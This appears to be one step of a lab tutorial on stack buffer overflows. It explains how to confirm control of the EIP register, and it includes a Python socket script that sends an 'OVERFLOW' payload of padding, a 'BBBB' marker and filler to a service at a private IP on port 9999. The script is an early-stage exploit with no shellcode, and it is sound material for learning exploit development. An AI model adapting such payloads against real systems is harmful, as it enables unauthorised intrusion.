Exploitation Step 3

Gaining Control of the Extended Instruction Pointer (EIP)

Confirming the ability to overwrite EIP with an attacker-controlled value.

The Goal: Overwrite EIP

With the exact offset, we can now craft a payload to place a specific, known value into the EIP register. This confirms our control over program execution.

  • Use the calculated offset from the previous step.
  • Insert a recognizable pattern (e.g., 'BBBB') at the EIP location.
  • Observe the EIP register in the debugger for confirmation.
Key Takeaway

Controlling EIP is verified by sending a payload with a known marker (like 'BBBB') at the calculated offset, and observing that marker in the EIP register in the debugger.

Crafting the EIP Control Payload

import socket

target_ip = "192.168.1.10"
target_port = 9999

offset = 1780 # Example offset from msf-pattern_offset
total_length = 2000 # Total length that caused the crash

junk_before_eip = b"A" * offset
eip_overwrite = b"BBBB" # Our controlled value for EIP
junk_after_eip = b"C" * (total_length - offset - len(eip_overwrite))

payload = junk_before_eip + eip_overwrite + junk_after_eip

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))
    print("Sending EIP control payload...")
    s.send(b"OVERFLOW " + payload + b"\r
")
    s.recv(1024)
    s.close()
    print("Payload sent! Check EIP in debugger for 0x42424242.")
except Exception as e:
    print(f"Error: {e}")

This Python script constructs a payload with 'A's up to the offset, 'BBBB' to overwrite EIP, and 'C's for the remainder. After execution, EIP in Immunity Debugger should show `0x42424242`.
